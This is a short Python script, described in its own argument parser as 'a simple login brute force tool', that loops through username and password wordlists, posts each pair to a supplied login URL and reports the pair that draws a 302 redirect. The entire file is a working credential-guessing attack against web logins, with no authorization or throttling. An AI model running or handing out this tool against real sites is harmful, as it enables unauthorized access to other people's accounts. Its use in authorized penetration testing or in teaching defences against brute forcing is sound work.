import requests
import argparse
parser=argparse.ArgumentParser("A simple login brute force tool")
parser.add_argument('--url',type=str,help="link of the login page ",required=True)
parser.add_argument('-P','--passlist',type=str,help="password aciii file required",required=False)
parser.add_argument('-U','--userlist',type=str,help="users aciii file required",required=False)
parser.add_argument('-u','--username',type=str,help="known username required ",required=False)
parser.add_argument('-p','--password',type=str,help="known passsword required",required=False)
args=parser.parse_args()
url=args.url
def only_password(passlist,username):
    with open(passlist,'r') as file:
        words=file.read()
        word=words.split()
        for i in word:
            data={"username":username,"password":i}
            response=requests.post(url,data=data,allow_redirects=False)
            print("data input :",data,"\t",response.status_code)
            if(response.status_code==302):
                print("password got :",i)
                break
def only_username(userlist,password):
    with open(userlist,'r') as file:
        words=file.read()
        word=words.split()
        for i in word:
            data={"username":i,"password":password}
            response=requests.post(url,data=data,allow_redirects=False)
            print("Data input :",data,"\t",response.status_code)
            if(response.status_code==302):
                print("password got :",i)
                break
def pass_and_user(userlist,passlist):
    with open(userlist,'r') as fileu:
        with open(passlist,'r') as filep:
            wordsu=fileu.read()
            wordsp=filep.read()
            wordu=wordsu.split()
            wordp=wordsp.split()
            for u in wordu:
                for p in wordp:
                    data={"username":u,"password":p}
                    response=requests.post(url,data=data,allow_redirects=False)
                    print("Data input :",data,"\t",response.status_code)
                    if(response.status_code==302):
                        print("Username got ",u,"Password got ",p)
                        exit(1)
if args.userlist and args.passlist:
    pass_and_user(args.userlist,args.passlist)
elif args.userlist:
    only_username(args.userlist,args.password)
elif args.passlist:
    only_password(args.passlist,args.username)
